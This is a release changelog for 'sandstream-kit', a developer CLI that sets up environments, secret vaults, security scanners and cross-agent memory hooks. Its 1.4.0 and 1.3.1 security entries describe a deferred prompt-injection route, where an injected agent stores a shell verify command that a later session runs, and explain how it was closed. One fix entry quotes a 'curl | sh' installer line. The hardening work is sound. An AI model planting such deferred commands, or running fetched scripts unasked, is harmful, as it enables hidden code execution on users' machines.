- **The stale-kit notice now reaches Claude Code, not just a terminal banner.** The memory hooks (`kit memory hook session-start` / `user-prompt-submit`) inject an actionable "kit X → Y — run `kit upgrade --self`" line into the agent's context when a newer version is cached — so the prompt to update appears where the work happens. It is cache-only (no network on the per-prompt hot path; the cache is refreshed by `kit check` / the post-command banner) and fail-open.

### Fixed

- **`kit heal` looked frozen during long scans.** `runHeal` re-ran the full security suite (trivy / semgrep / socket / trufflehog / bumblebee) up to four times with zero output, so a multi-minute run appeared hung. It now streams progress to stderr — per-round "scanning…" with elapsed time, each safe fix as it is applied, and the confirm re-scan — keeping stdout clean for `--agent`'s machine-readable proposals.

## [1.9.0] - 2026-06-20

### Added

- **`kit check` flags a stale kit version.** A newer published kit now surfaces as a warn in `kit check` ("kit X → Y available — run `kit upgrade`"), not just the passive banner — so a stale CLI carrying already-fixed bugs (e.g. the `kit memory search` crash fixed in 1.6.1) is visible during a normal health check. Gated by a new `[update] check` config (default true; also honors `KIT_NO_UPDATE_CHECK=1` and self-skips in CI). Reuses the existing update-check + cache, no extra network in CI. (Auto-update deliberately NOT added: auto-trusting whatever npm serves next is at odds with kit's pin-and-verify posture — use `kit upgrade` deliberately.)

## [1.8.0] - 2026-06-19

### Fixed

- **The supply-chain (bumblebee) gate was silently broken on cache reuse.** The cache re-verification (F3) hashed the extracted _binary_ and compared it to the _tarball_ checksum — different artifacts — so every run after the first download reported "cached binary checksum mismatch" and refused bumblebee. The gate effectively ran only once, on first install. Now the binary's own SHA-256 is recorded at trusted-install time (a `bumblebee.sha256` sidecar) and cache reuse verifies against THAT; the pinned `TARBALL_CHECKSUMS` still gate the download (the authoritative supply-chain anchor, unchanged). A legacy cache with no sidecar re-downloads to re-establish trust. (`KIT_BUMBLEBEE_CACHE` env added for test isolation; the previously-missing F3 regression test now covers reuse / tamper / legacy.)

### Added

- **`kit heal` — bounded self-heal loop (detect → remediate → track, closed).** Loops over `kit check` findings: auto-applies the SAFE, deterministic, reversible fixes (install a missing scanner via mise, patch `.gitignore`) and re-scans until green, with PAL auto-close confirming each heal. Two classes are deliberately never auto-healed: **GATED** (secret rotation, history purge, propagate, `npm audit fix`) are proposed with the exact command but only the human/agent runs them, still through the elevation gate + audit log; **FAIL-CLOSED** (a supply-chain checksum mismatch = possible tampering) is surfaced loudly and refused, never auto-cleared, exiting non-zero — but it does not block applying unrelated safe fixes. `--dry-run` plans without changing anything; `--agent` emits the gated proposals as a structured block for an external agent to run (kit stays zero-LLM: it proposes, the agent executes). So an autonomous agent can drive an environment to green yet can never rotate a secret, rewrite history, or trust a tampered binary. (Refactor: the security→PAL bridge moved to `src/findings-track.ts`, shared by `kit check` + `kit heal`.)

## [1.7.0] - 2026-06-19

### Added

- **`kit check` findings are now tracked in the PAL ledger (the "track" layer).** Detect → remediate → **track**: each actionable security finding becomes an open `kind='finding'` item in the cross-session PAL ledger, so it surfaces as a reminder next session (via the existing SessionStart / prompt hooks) instead of scrolling past and being forgotten. The loop is self-maintaining: a finding the next scan no longer reports **auto-closes**, and one that cleared and recurs **reopens** — finding-presence itself is the verify, so no shell and no stored command (same security posture as the rest of PAL). Selective by design: only `fail`s plus `warn`s in security-relevant categories (secrets / exposure / supply-chain) become items — not every warn. Deterministic per-finding ids (`sec-<hash>`) make re-scans idempotent and reconciliation per-source. Opt out with `[memory] track_findings = false`. New core: `palSyncFindings` (src/memory/pal.ts); wired into `cmdCheck`, fail-open.

## [1.6.1] - 2026-06-19

### Fixed

- **`kit memory search` crashed on ordinary queries.** The raw query string was passed straight to SQLite FTS5 `MATCH`, where it is parsed as FTS5's own query _language_ — so any term containing an operator char (`-`, `:`, `"`, `*`) or a bare `AND`/`OR`/`NEAR` threw `no such column: …` (e.g. `kit memory search "auto-close"`). Queries are now sanitized into a safe MATCH expression (each whitespace term double-quoted with embedded quotes escaped, prefix-matched, joined by implicit AND), so arbitrary text searches cleanly. Blank queries short-circuit to no results.

## [1.6.0] - 2026-06-18

### Added

- **`kit init` auto-detects the secret backend a repo already uses.** `.infisical.json` -> Infisical, `doppler.yaml`/`.doppler.yaml` -> Doppler. The detected store becomes the prompt default (and the non-interactive choice), instead of always defaulting to 1Password and hardcoding the wrong store in `--yes` runs.
- **`kit init` seeds `[secrets.keys]` from an existing `.env.example`.** Keys in `.env.example` / `.env.template` / `.env.sample` (e.g. `DATABASE_URL`, `OPENAI_API_KEY`, `JWT_SECRET`) are unioned into the generated config, deduped against the detected services' template keys, so a project's real secret contract is preserved rather than reduced to the handful kit has templates for.
- **`kit init` respects the repo's pinned runtime versions.** Node is resolved with precedence `.tool-versions` > Volta (`package.json#volta`) > `.node-version` / `.nvmrc` > `engines.node` > 22 (was: only `engines.node`, else 22); Python honours `.python-version` / `.tool-versions` (was: hardcoded 3.12). Stops kit from installing the wrong runtime on a brownfield repo.
- **More services in the registry:** Redshift, Redis/Upstash, Auth0 (just data rows, thanks to the registry).
- **Monorepo / workspace detection.** `kit init` now unions the dependencies of every workspace member before detecting framework + services, so a turborepo / pnpm-workspace whose `next`/`stripe`/`@supabase/supabase-js` live in `apps/*` or `packages/*` is detected from the root instead of coming up empty. Reads `package.json#workspaces` (array or `{packages}`) and `pnpm-workspace.yaml`; expands one-level `apps/*` style globs. Non-workspace repos are unaffected (byte-identical).
- **Native mobile + desktop stack detection.** `kit init` now recognizes mobile/native projects that have no `package.json`-with-web-framework: **React Native** (framework wins over plain react), **Flutter** (`pubspec.yaml` → dart), **iOS/Swift** (`Podfile` → framework `ios`, bare `Package.swift` → language swift for server-side Swift), and **Android** (`build.gradle`/`.kts` applying `com.android.*` → kotlin/android). Each gets a sensible `[setup]` (e.g. `flutter pub get`/`flutter analyze`, `pod install`, `./gradlew build`), and service detection runs for them too (a Flutter app using Firebase gets `firebase` wired). Generic JVM-Gradle and server-Swift are labelled by language without a mobile framework, to avoid mislabelling backends.
- **Data-driven service registry (init-v2 keystone) + cross-language detection.** Service detection and generation used to live in two hand-synced tables (`SERVICE_DETECTORS` in stack-detector, `SERVICE_TEMPLATES` in toml-generator), and the per-language detectors hardcoded `services: []`, so the whole secrets/login/tool layer was Node-only and adding a service meant editing two files. Both are now one `src/service-registry.ts` (`ServiceDef` per service: detection signals + login/check/secrets/tool/migrate), read by both the detector and the generator. Two payoffs: (1) a **Python/Go/Rust/PHP** repo that uses Stripe/Supabase/Sentry now gets those services detected (was always empty); (2) adding a service is **one data entry**. Seeded the previously-invisible stacks: **Convex, Firebase/Firestore, MySQL, PlanetScale, Neon, Turso, BigQuery, Snowflake**. Pure refactor for the existing 16 services (byte-identical `.kit.toml` output, all prior tests green); migrate precedence (supabase → prisma → drizzle) preserved via registry order.

## [1.5.0] - 2026-06-18

### Added

- **Choosing a vault now wires it up end-to-end (no more silent dead-end).** Picking a secret backend at `kit init` used to record `store = "…"` and nothing else — the CLI was never installed, no login was guided, and `kit secrets` then failed key-by-key with "CLI not available", leaving the user to guess why. Now the choice is fully provisioned: (1) the vault's CLI is added to `[tools]` so `kit setup` installs it via mise (Infisical/Doppler/Bitwarden/1Password/Vault; cloud secret managers ship their CLI via the cloud env, so they're guided but not provisioned); (2) the vault backends resolve that CLI **mise-first** — the same PATH dead-end that bit the scanners, since mise shims aren't on kit's PATH, so the binary kit just installed is actually found; (3) `kit init` prints the exact next steps the moment you choose (`kit setup` installs it; then `infisical login && infisical init`), and `kit secrets` raises a **loud, actionable flag** when a configured vault resolves zero secrets ("CLI isn't installed — run `kit setup`" vs "installed but not logged in — run `<login>`") instead of a column of silent ✗ lines. Infisical configs also get a scaffolded `[secrets.infisical]` binding block (`environment = "dev"` + a `project_id` pointer). Login stays the user's own account action — kit guides it, never runs it.
- **`kit setup` now installs project dependencies + runs the verify build (`[setup]` is no longer dead config).** The generated `[setup] install/migrate/verify` block had **zero** runtime consumers — `kit setup` provisioned the toolchain (node/pnpm via mise) but never ran `pnpm install`, so the repo wasn't actually working afterward and the block silently over-promised. Now `kit setup` runs `[setup].install` after the toolchain step and `[setup].verify` at the end (folded into the pass/fail gate). `migrate`/`seed` are **intentionally not auto-run** — a configured `supabase db push` / `prisma migrate deploy` can mutate a linked (possibly production) database — so they're surfaced with the exact command and run only behind `kit setup --with-migrate`. Commands with shell operators are refused (printed to run manually) rather than mis-split, per kit's no-shell exec invariant.
- **`kit init` offers to lock a brownfield repo's environment (`[context]`).** When a repo already talks to gcloud / Vercel / GitHub but declares no `[context]`, `kit init` now surfaces the detected account+project and offers to write the `[context]` lock (the same `gatherLive`/`suggestContextToml` the empty-state `kit context check` uses). kit does **not** install or authenticate these — it locks _which_ account+project this repo is bound to, the exact pairing where cross-account contamination hides. Gated on a meaningful binding (gcloud account / Vercel project / GitHub org — not git-email/npm-registry alone, which are too noisy), defaults to **no** (the values are the currently-active CLI state, which the lock exists to question), and prints-only in non-interactive runs.
- **`kit check` adds an IaC misconfiguration scan (`trivy config`).** Distinct from the container-CVE scan: it flags insecure _infrastructure config_ in Dockerfiles, Compose files, and Terraform (root user, privileged containers, public buckets, missing healthchecks, …). Runs only when IaC is present (Dockerfile/Compose/`.tf`), resolves trivy mise-first, and reports HIGH/CRITICAL as a warning. First of the 1.5.0 scanner-coverage round.
- **Deep secret scan on by default.** trufflehog is now a default mise-provisioned tool (`aqua:trufflesecurity/trufflehog`), and `kit check` resolves the `trufflehog` bin mise-first — so the deep secret scan runs out of the box instead of only when trufflehog happens to be on PATH. It scans **git** (`git file://.`, committed content) rather than the raw filesystem, so it's fast (skips `node_modules`), ignores gitignored local `.env*` (no false positives), and reports only real findings (filters trufflehog's info log line). Falls back to the basic regex scan when trufflehog can't be resolved.
- **Conditional scanner provisioning + OSV-scanner.** `kit init` now provisions scanners _only where they apply_: trivy (`aqua:aquasecurity/trivy`) when a Dockerfile/Compose is present, pip-audit (`pipx:pip-audit`) for Python, and osv-scanner (`aqua:google/osv-scanner`) for ecosystems with no dedicated scanner (go/rust/php/… — deliberately skipped for node/python to avoid duplicating `npm audit`/pip-audit). `kit check` gains an `osv-scanner` multi-ecosystem dep-CVE check (resolves mise-first; skips cleanly when absent). Completes the scanner-coverage round: every layer (deps · supply-chain · SAST · container · IaC · secrets) is covered, each ecosystem with one primary dep-CVE scanner.

### Security

- **`kit setup` hardens `.gitignore` before materializing `.env.local`.** The secrets step ([4/6]) writes `.env.local`, but `.gitignore` hardening lived only in the standalone `kit security check-gitignore --fix` / `kit fix` — never the default `setup`/`init` path. So on a repo whose `.gitignore` lacked `.env.local` (common — many only ignore `.env`), kit wrote real secrets into a file the next `git add .` would stage, violating its own "secret-safe" promise. `kit setup` now patches `.gitignore` (idempotent, repo-local append) right before the secrets step and announces it. The standalone command remains for the manual path.

## [1.4.3] - 2026-06-18

### Added

- **`kit setup --recommended` — opinionated, batteries-included profile.** After the core pipeline it wires the cross-harness **memory hooks**, a **pre-commit secret-scan** gate, and a **pre-push context-check** gate (only when `[context]` is declared) — using the hardened installers (absolute-path memory hooks; hooksPath-aware, no-clobber, absolute-`kit` git hooks). It announces up front that it touches `~/.claude` and the repo's git hooks. So one command takes a repo from clone to a fully-wired, agent-runnable, self-checking environment. Interactive `kit setup` now **asks** whether to use the recommended profile (default yes); `--recommended` / `--minimal` are the non-interactive answers to that question, and CI/agents without a flag get the core setup (never silently wiring global `~/.claude` hooks). Plain `kit setup` now _also_ grants the read-only kit permission allowlist in `[5/6]` (previously only `kit agent-config` did), so the agent can run kit after setup.

### Fixed

- **`kit check` finds mise-installed scanners (socket, semgrep, trivy).** The security step looked for them with a bare PATH lookup, so a scanner installed via mise — whose shims aren't on kit's own PATH — was reported "not installed" even when present. A new `resolveToolBin` resolves mise-first (`mise which`) then PATH; check-security uses it for all three. Groundwork for managing them as default mise-provisioned scanners. (trivy stays container-conditional — it only runs when a `Dockerfile` is present.)
- **`kit memory install` writes hooks that actually run.** Hooks were written as a bare `kit memory hook …`, but Claude Code runs hooks in a non-login `/bin/sh` whose PATH usually does **not** include the npm global bin (`~/.npm-global/bin`, nvm/volta/pnpm shims, …). So the hook failed with `kit: command not found` and **silently broke memory capture** — the store looked installed but recorded nothing live. Install now pins an absolute `<node> <cli.js>` invocation resolved from the running process, matches existing hooks by suffix (so re-install dedupes and uninstall cleans up legacy bare entries), and **warns loudly** if it cannot resolve an absolute path instead of failing silently.

### Added

- **`kit init` provisions security scanners by default.** Generated `.kit.toml` now includes semgrep (`pipx:semgrep`) and socket (`npm:@socketsecurity/cli`) in `[tools]`, so `kit setup`'s install step provisions them via mise and `kit check` runs them out of the box (paired with the mise-aware resolution that finds them). They were "optional/not installed" before; now they're on by default like the built-in scanners. Remove from `[tools]` to opt out. (socket's deep scan still needs `socket login`; semgrep pulls a Python toolchain via pipx.)
- **`kit agent-config` now lets the agent actually _run_ kit.** Teaching an agent to "use kit" is useless if every `kit …` hits the permission wall in auto/non-interactive mode — the agent gets blocked and silently never runs it. `agent-config` now merges the **read-only** kit commands (`check`, `status`, `doctor`, `ci`, `analyze`, `escalate`, `context check`, `triage`, `memory search`/`stats`/`index`) into the project's `.claude/settings.json` `permissions.allow`. Idempotent and non-destructive — preserves your other rules, only grants read-only commands (secrets/fix/hooks/agent-config keep prompting), and **never** writes a `deny` rule or sets a bypass mode.
- **`kit agent-config` now teaches agents about memory.** The managed "use kit" block injected into CLAUDE.md / AGENTS.md / .cursorrules / .clinerules gains a bullet: recall prior decisions with `kit memory search "<query>"` (cross-session, cross-agent) and keep the store current with `kit memory index`. Previously the block covered check/triage/secrets/elevate but never mentioned the memory store, so agents in a kit repo had no pointer to it. Also refreshed the README's memory command summary (was missing `stats`, `merge`, `save`/`threads`).

## [1.4.2] - 2026-06-17

### Fixed

- **`kit <command> --help` shows help instead of running the command.** A `--help`/`-h` after any top-level command fell through to the dispatch and _executed_ the command — harmless for read-only ones, but `kit agent-config --help` would inject its rules block, and `fix` / `secrets` / `hooks add --help` would run their side effects. The main dispatch now intercepts `--help`/`-h` for any command and prints that command's help (generalizes the 1.4.0 fix that only covered `kit memory <sub> --help`).
- **Informational services are a warning, not a failure, in `check` / `ci` / `escalate`.** A service whose login is `#`-documented (no CLI — e.g. resend "set `RESEND_API_KEY`", sentry "get DSN") was reported as `✗ fail`, dragged down the overall gate, and `escalate` printed a nonsensical `Run: # resend …`. It now shows as a `warn` / "manual setup (no CLI login)", does not fail the gate, and `escalate` shows the documentation message. (Extends the 1.4.1 `manual` login state to the check/ci/escalate paths.)
- **`kit security scan-build` no longer false-positives on framework manifests.** Terraform/tfstate finding labels (`tfstate-value`, `terraform-sensitive`) are filtered out of build-artifact scanning, so a Next.js `routes-manifest.json` `"value":"…"` route entry is no longer reported as a potential secret. Real inlined credentials (Stripe/JWT/AWS/…) are still caught.
- **`kit memory status` now aliases `kit memory stats`** (was "unknown subcommand").
- **`kit review`, `kit design`, and `kit baseline` now have help text** (`kit <cmd> --help` / `kit help`).

### Security

- **Encrypted backup passes an explicit `authTagLength` (16) to `createCipheriv`/`createDecipheriv`.** The GCM auth tag was already fixed at 16 bytes (`setAuthTag` + `final()`), so this is a hardening assertion that also clears the Semgrep `gcm-no-tag-length` finding that was blocking the "Security — Full App Scan" workflow.

## [1.4.1] - 2026-06-17

### Added

- **`kit memory stats` shows a per-harness session breakdown** (e.g. `claude-code 212, codex 1`) — the portability proof that the externalized store spans agents, not one tool, so you can pick up the same context from a different harness. Included in `--json` as `byHarness`. Also corrected the `kit memory index` help, which undersold itself as "~/.claude transcripts" though it indexes every supported harness (Claude Code, Codex, Gemini, Cursor, …).
- **`kit context check` empty-state now suggests a `[context]` block detected from the repo.** Instead of a bare "add one" line, it prints a ready-to-paste block built from the live context, annotated by source: git/github/vercel come from repo-local truth (git config, origin remote, `.vercel/project.json`) and are marked authoritative; gcloud/npm are ambient/global and flagged "VERIFY this is right for THIS repo" — because the whole point of the lock is that the currently-active account/project is what must be questioned, not trusted. Tables kit cannot read are omitted. (`suggestContextToml`, pure + unit-tested.)
- **Quick start + Prerequisites** in the README and `kit --help`. Lists Node 22+, git, and [mise](https://mise.jdx.dev) (used to install the tools in `[tools]`), the npx vs global-install paths (incl. the user-prefix fix for `npm -g` permission errors), and the first-run command sequence (`init → check → setup → context check`). `kit --help` now leads with a "Get going" line.

### Fixed

- **`kit hooks` installs into the directory git actually runs hooks from, and never clobbers a foreign hook.** Hook install hardcoded `.git/hooks`, which git ignores entirely when `core.hooksPath` is set (husky, lefthook, a committed `.githooks/`) — so an installed gate like `context-check` reported `✓ installed` but **silently never ran** (false security). `resolveHooksDir` now honors `core.hooksPath`. And because that means kit may target a directory holding the operator's own committed hooks, install now **skips an existing hook it did not generate** (no `Generated by kit` marker) with guidance to merge or remove it, instead of overwriting it wholesale and dropping whatever it enforced.
- **`[context]` no longer triggers a spurious "unknown section" warning.** The config validator's known-section allowlist omitted `context` (added in 1.4.0), so every `kit context` run warned about the very section it reads.
- **Auth-status detail is a single redacted line.** `kit login` / `kit check` showed a service's full multi-line check-command output as its status detail — for `stripe config --list` that meant a verbose dump of account metadata (account IDs, display names for _every_ configured account) spread across the status table. (Credential _values_ were already masked by `redactSecrets` at the check source, so this was noise + metadata exposure, not a key leak.) Output now collapses to the first non-empty line, length-capped, via a new `safeStatusLine` helper applied at every display site — `kit login`, the `kit check` Services table (`output.ts`), and `--json`. `safeStatusLine` re-runs the canonical `redactSecrets`, which also closes a gap where `login.ts`'s post-login verify did not redact its own output.
- **`kit secrets` no longer clobbers a working `.env.local`.** When the vault resolved zero secrets (e.g. Infisical unauthed), `generateSecrets` overwrote an existing `.env.local` with an empty comment-only scaffold, destroying local-dev credentials. It now skips the write and leaves the file intact when nothing resolved (it still writes a scaffold when no file exists yet).
- **Services with no CLI login show as "manual", not "failed".** A service whose `.kit.toml` `login` is informational (`# … set X in env`, e.g. resend, sentry) is expected manual setup — it no longer counts as a login failure, and is no longer pointlessly retried with backoff on every `kit setup`.
- **Clear message when mise is missing.** `kit setup` / `kit install` now says "mise is not installed — install with `brew install mise` (or `curl https://mise.run | sh`)" instead of surfacing a raw `spawn mise ENOENT`. kit uses mise to install and pin tool versions; if it is absent, the failure is now actionable.
- **Surface mise's real error instead of "Command failed".** When `mise install` fails, kit now reads mise's stderr and shows the concrete `mise ERROR …` line. It specifically detects an untrusted `.mise.toml` (mise refuses to run until `mise trust`) and tells you to review the file and run `mise trust` — previously this surfaced only as an opaque `Command failed: mise install …`.

## [1.4.0] - 2026-06-17

### Added

- **`kit context check` — per-project CLI context lock.** Declare each tool's exact account + project in `.kit.toml` `[context]` (gcloud account/project, vercel team/project, github org/remote, git email, npm registry). `kit context check` reads the LIVE tool state and verifies it matches, and **never infers a pairing from whatever happens to be logged in or selected**: a right account with the wrong project is a mismatch, not a pass. Read-only; exits non-zero on a mismatch so it can gate a git hook or an agent before an outward or destructive command. Context pointers are non-secret and live in config; the credentials they authenticate with stay in the vault. (Catches the class of incident where a repo carries a stale deploy connection from a previous purpose, or a CLI is pointed at the wrong org.)
- **`kit hooks add context-check`** — installs a `pre-push` git hook that runs `kit context check` and blocks the push on a mismatch. This is the enforcement: a push to the wrong org/project is stopped before it leaves the machine.
- **`kit context use`** — activates the declared context (gcloud config + repo git identity) so every CLI points at the right account/project atomically. Touches only local config, never an account or a deploy; vercel/npm get guidance rather than an auto-switch.
- **`kit context --prompt`** — a fast, read-only indicator of the active gcloud context (e.g. `[gcp:my-project]`) for your shell prompt, read from gcloud's config files (no subprocess per prompt), so the context you are in is always visible.
- **Rule citations on security checks.** Each `kit check` security finding now carries the rule it enforces (CWE / OWASP Top 10) in the `--json` output and as a `[CWE-…]` tag in the text table, via a local, deterministic rules catalog (`src/rules/catalog.ts`). It cites kit's own checks (gitignore, secrets, dep-pinning, lockfiles, service exposure); a check without a defensible anchor carries no rule rather than a forced one. Foundation for consolidating + citing findings across kit and the scanners it wraps.

### Changed

- **`kit memory pal add` verify flags:** use `--verify-http <url> [--expect <code>]` or `--verify-file <path>` instead of `--verify "<shell>"`. For checks these types do not cover, run the check yourself and close the item manually (pal stays a ledger). Raw shell `verify_cmd` from pre-1.4 stores is retained so `kit memory scan` can still find secrets in old rows, but is never auto-executed.

### Fixed

- **A `--help`/`-h` flag never executes a side-effectful subcommand.** `kit memory <subcommand> --help` (e.g. `kit memory install --help`) previously ran the subcommand instead of printing help, so `kit memory install --help` would actually install the hooks. It now shows help and does nothing else.

### Security

- **PAL verify is now a declarative, typed check instead of a raw shell command.** `palAutoVerify` no longer runs a stored shell string through `execSync`; it runs a typed check natively (`http-status` via fetch, `file-exists` via fs), never through a shell and never by interpolating a stored value into a command. There is no longer an arbitrary-command-execution sink. This removes a persistence/deferred-execution risk that mattered for kit's agent-native use: a prompt-injected agent could previously store a `verify_cmd` in one (low-trust) session that detonated later when a more-trusted session ran `kit memory pal verify`. The typed model is also deliberately autonomy-friendly: auto-verify needs no human gate, yet a planted or injected value is inert (a defensive parser rejects any unknown shape). Closes the residual `memory/pal.js` finding (Socket AI) at the root rather than by adding a human-in-the-loop gate that would break autonomous agent jobs.

## [1.3.1] - 2026-06-17

### Security

- **PAL: a `verify_cmd` from a file or another machine's DB is never auto-executed.** `kit memory pal` auto-verify runs an item's `verify_cmd` through the shell to auto-close pending actions. That executable command is now only ever created by `pal add` (operator-authored in the current session). Both external-source paths now demote incoming items to `kind='manual'` with no `verify_cmd`: `importLegacyLedger` (reads a JSONL whose path is overridable via `KIT_PAL_LEDGER`) and `kit memory merge <other.db>`. So a command that crossed a file or DB boundary can never auto-run; re-add via `pal add` to re-enable auto-verify. This closes a backdoor-like arbitrary-command-execution vector in adversarial agent/CI contexts (flagged by Socket's AI analysis on `memory/pal.js`). Added a regression test asserting an imported `verify` never executes.

## [1.3.0] - 2026-06-16

### Added

- **Three more memory harnesses** — `kit memory index` now also reads **Cursor** (`globalStorage/state.vscdb`), **Amazon Q Developer CLI** (`amazon-q/data.sqlite3`), and **Cline** (VS Code `saoudrizwan.claude-dev/tasks/*/api_conversation_history.json`), bringing the source-verified set to seven: Claude Code, Codex, Gemini, Continue, Cursor, Amazon Q, Cline. Each parser is built against the agent's own serialization format (verified from source or community readers), never guessed; the Cursor + Amazon Q SQLite parsers are **defensive** — they map only known fields and index nothing if the shape ever differs, so they can never write wrong data. GitHub Copilot CLI, Google Antigravity, Zed, and Kiro stay out until their formats are source-verifiable (Copilot: no schema/stability contract per [copilot-cli#3551](https://github.com/github/copilot-cli/issues/3551); Antigravity IDE: binary protobuf, no public `.proto`; Zed: LMDB store, would need a native dep; Kiro: closed-source/undocumented).
- **`kit memory suggest [--limit N] [--json]`** — opt-in, BYO-LLM memory review that **preserves the zero-LLM core**: kit never calls a model. It deterministically gathers the current project's recent activity + open action items and emits a structured prompt to stdout for _your_ model to propose new `pal` items / shared-area entries — `kit memory suggest | <your-llm>`. Accepted proposals are recorded via `kit memory pal add` / `kit memory share`.
- **Per-service auth strategies** — services may declare `auth = "vault" | "capture" | "interactive"` in `.kit.toml`; when omitted it's inferred (interactive if a `login` command exists, else vault). `kit login --plan` (read-only, `--json` supported) shows the resolved strategy per service plus a passkey/browser warning for logins that can't be scripted on a fresh machine (gh, vercel, cloudflare, …). The deterministic resolver lives in `service-auth.ts`.
- **`kit secrets set <KEY>`** — capture-to-vault: write a user-provided value to the configured vault via `--stdin` (safer — not in argv/ps) or `--value`. This is the execution behind a service's `auth = "capture"` strategy; it reuses the existing `setSecretValue` path so the secret is never echoed or logged. Exposes a vault-write that previously had no CLI surface.

### Fixed

- **`kit open` / `openInBrowser` no longer spawns a browser in non-interactive/CI/test runs** — it now honors `isNonInteractive()` and prints the URL instead (mirroring `login.ts`). This stopped the test suite from popping the Stripe dashboard window during `npm test` (Stripe was the only service whose dashboard auto-opened). `npm test` now also runs with `KIT_NON_INTERACTIVE=1`, and the open suite forces it itself for hermeticity.
- Stopped shipping cloud-sync conflict copies (`* 2.js`) in the published package — deleted the stale `* 2.ts` source duplicates and added a `tsconfig` `exclude` + `.gitignore` guard so they can't recompile into `dist/` or be committed again. (They had leaked into the 1.2.0 tarball.)

## [1.2.0] - 2026-06-16

### Added

- **Multi-harness memory** — `kit memory index` pulls transcripts from every supported coding agent on the machine, each tagged with a `harness` so recall spans them: **Claude Code** (`~/.claude`), **Codex** (`~/.codex/sessions`), **Gemini CLI** (`~/.gemini/tmp`), and **Continue.dev** (`~/.continue/sessions`). New `indexAllHarnesses()` registry with per-harness counts in the index report. Each parser is built against the agent's own serialization format (verified from its source), never guessed; absent agents are skipped silently. Adding a harness is a single parser. (Cursor, Amazon Q, and Cline followed in 1.3.0.)
- **`kit status [--json]`** — a deterministic cross-subsystem adoption checklist: which subsystems are set up (config, secrets vault, tools, gitignore hygiene, dependency policy, agent-config, memory, hooks) plus a rule-based next step for each gap. No inference — every signal is read from real local state.
- **SessionStart recovery hook** — a third fail-open memory hook that re-injects the current project's most-recent messages + open action items after a resume/compaction, so a session regains continuity instead of starting blank. Wired by `kit memory install` alongside `UserPromptSubmit` + `SessionEnd`.
- **`kit memory merge <other.db>`** — consolidate another machine's memory store into this one (idempotent, dedup by message uuid) — e.g. folding a laptop's history into a workstation's.
- **Google web-search provider** — `kit check`'s web-search probe now runs a real Custom Search JSON API health check (config `apiKey` + `cx`), replacing the previous not-implemented stub.

### Changed

- **Incremental indexing** — `kit memory index` skips transcripts unchanged since the last run via a new `file_index` table (mtime + size), with the per-message uuid dedup as a backstop. Re-indexing a large history is now near-instant.

## [1.1.0] - 2026-06-16

### Added

- **`kit memory`** — a local-first, deterministic second brain (SQLite + FTS5, zero model calls, two fail-open hooks). Index `~/.claude` transcripts, project-scoped full-text `search`, `UserPromptSubmit` reminder + `SessionEnd` sync, encrypted `backup`/`restore` for disaster recovery, `scan` for secrets stored in the DB, a pending-action ledger (`pal`, auto-closes on verify), named-copilot bookmarks (`save`/`threads`/`resume`), and a curated, area-organized, secret-scanned shared team tier (`share`/`areas`/`area`). See [`docs/MEMORY.md`](docs/MEMORY.md). Schema + two-hook design credited to [cloudctx](https://github.com/chadptk1238/cloudctx) (MIT).

## [1.0.1] - 2026-06-14

### Changed

- Documentation and packaging cleanup ahead of the public release.

> Public versioning for `sandstream-kit` starts at **1.0.0** — the first published release. Entries below this point document the unpublished `sandstream-kit` development lineage and are kept for internal traceability.

## [1.1.0] - 2026-05-30

### Added

- **Full-app security workflow** (`.github/workflows/security.yml`) with 9 gating stages: deps (npm audit + Snyk), supply-chain (bumblebee), SAST (ESLint + Semgrep + SonarCloud), DAST (ZAP — scoped out for CLI), container (Trivy CRITICAL+HIGH SARIF), infrastructure (Checkov + tfsec), secrets (gitleaks), GDPR + headers, kit self-check, plus aggregated gate
- **Agent-hook templates** (`examples/agent-hooks/`) for Claude Code (PostToolUse), Codex (AGENTS.md + MCP), Cursor (.cursorrules + .cursor/mcp.json), Cline (.clinerules + MCP autoApprove). Cross-provider git pre-commit fallback documented in `examples/agent-hooks/README.md`
- Supply-chain exposure scanning via [bumblebee](https://github.com/perplexityai/bumblebee)
  - New `supply-chain` security check in `kit check` / `kit ci` that flags installed packages matching curated known-compromise catalogs (Shai-Hulud, typosquats, credential stealers, malicious editor/browser extensions, MCP servers)
  - Pinned release binary auto-downloaded and SHA-256-verified (no Go toolchain needed), cached under `~/.kit/tools/bumblebee/<version>/`
  - kit Action scans the checked-out repo in CI (`deep --root .`); local runs scan the machine baseline
  - Tunable via `KIT_BUMBLEBEE`, `KIT_NO_DOWNLOAD`, `KIT_BUMBLEBEE_PROFILE`, `KIT_BUMBLEBEE_ROOTS`, `KIT_BUMBLEBEE_BIN`, `KIT_BUMBLEBEE_CATALOG`
- Phase 5F: Public Launch & Community infrastructure
  - CODE_OF_CONDUCT.md for community standards
  - CHANGELOG.md for release tracking
  - COMMUNITY.md for contribution guidelines
  - GitHub issue templates for bug reports and feature requests
  - GitHub discussions setup guide
- Phase 5E: Security Framework & Hardening
  - SECURITY.md with comprehensive security audit checklist
  - SECURITY-HARDENING.md with pre-deployment verification procedures
  - SECURITY-SCANNING.md with automated security scanning pipeline
  - 5-stage security scanning (dependencies, SAST, DAST, containers, infrastructure)
  - GDPR and data protection compliance validation
  - Security incident response procedures
- Phase 5D: Load Testing & Performance
  - k6 load testing infrastructure with baseline, marketplace, and autoscaling tests
  - Database stress testing and connection pool validation
  - Bottleneck analysis methodology and optimization strategies
  - Capacity planning guide with 3 scaling scenarios and cost analysis
  - Kubernetes autoscaling validation test

### Changed

- Enhanced security monitoring and alerting infrastructure
- Improved deployment pipeline with security gates
- Extended monitoring capabilities with Prometheus metrics

### Fixed

- npm audit highs: fast-uri (path traversal + host confusion) and next 16.2.6
- pre-existing master CI failures
  - `src/run.test.ts`: isolated-env test now uses `process.execPath` (exit 127 → 0)
  - `src/audit-logging-service.test.ts`: 4 compliance-report window races (capture `end` after recording)
  - `Dockerfile`: dumb-init path /usr/sbin → /usr/bin; ENTRYPOINT includes node + cli so args pass through
  - `Dockerfile.marketplace`: drop redundant nginx-user (UID 101 conflict with built-in)
  - `marketplace-frontend`: add lucide-react dep; swap missing `ShieldStar` → `Award`; widen team-members `newRole` type
  - `docker-build.yml`: SHA-tag prefix bug (`:-<sha>`), GHA cache for PR builds (no creds), conditional Docker Hub push when DOCKER\_\* secrets absent, `pull-requests: write` for PR-comment step
- workflow shell-injection (Semgrep): `deploy-production.yml`, `deploy-staging.yml`, `action/action.yml` — untrusted inputs moved to step `env:`, tag/cmd allowlists added
- gitleaks false-positive on `${ENV_VAR}` placeholders in config files

### Security

- 65% Checkov reduction (166 → 58 terraform findings, 64 → 32 distinct check IDs) — see `.checkov.yaml` baseline header for fix log
